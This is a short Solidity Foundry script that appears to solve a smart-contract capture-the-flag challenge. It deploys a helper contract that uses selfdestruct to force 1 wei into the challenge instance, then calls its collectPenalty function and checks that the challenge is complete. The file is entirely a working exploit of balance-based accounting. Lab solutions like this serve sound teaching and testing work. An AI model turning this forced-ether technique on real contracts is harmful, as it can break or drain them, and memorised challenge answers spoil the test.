// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.16;

import "forge-std/Script.sol";

interface IChallenge {
    function isComplete() external returns (bool);
    function collectPenalty() external;
}

contract ExploitScript is Script {
    function run(address instanceAddress) public {
        vm.startBroadcast();
        new Exploit{value: 1}(instanceAddress);
        IChallenge(instanceAddress).collectPenalty();
        require(IChallenge(instanceAddress).isComplete());
    }
}

contract Exploit {
    constructor(address instanceAddress) payable {
        selfdestruct(payable(instanceAddress));
    }
}
